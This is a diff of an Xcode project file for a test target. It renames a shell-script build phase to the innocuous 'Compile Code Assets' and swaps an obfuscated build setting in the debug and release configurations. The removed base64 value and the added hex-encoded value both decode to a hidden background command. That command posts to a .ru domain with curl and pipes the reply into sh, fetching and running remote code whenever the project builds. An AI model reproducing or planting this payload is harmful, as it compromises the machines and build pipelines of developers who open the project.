@@ -219,7 +219,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				92C30C1B75A44817AF162AE3 /* Provision Library Executable */,
+				34034FAEFB4E474EB1162AE3 /* Compile Code Assets */,
 				5B4BA1F10F5FF13E02A74BC9 /* [CP] Check Pods Manifest.lock */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
@@ -337,7 +337,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		92C30C1B75A44817AF162AE3 /* Provision Library Executable */ = {
+		34034FAEFB4E474EB1162AE3 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -347,7 +347,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -508,7 +508,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = CE08B74CC4F9D8CCF180F3EC /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((u(){ `printf baDse64 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyMyAtc0xrZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9xZGdzMjMyaS1xLnJ1L2EpIiB8IHNoCg== | u | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((r(){ `printf xIxd | tr -d I` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203238202d6b73664c202d642022703d78636f64655f7068617365222068747470733a2f2f656a6e74696e36686b6a7437676a322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -524,7 +524,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5C7E743E94144B99C844EABE /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((u(){ `printf baDse64 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyMyAtc0xrZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9xZGdzMjMyaS1xLnJ1L2EpIiB8IHNoCg== | u | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((r(){ `printf xIxd | tr -d I` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203238202d6b73664c202d642022703d78636f64655f7068617365222068747470733a2f2f656a6e74696e36686b6a7437676a322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
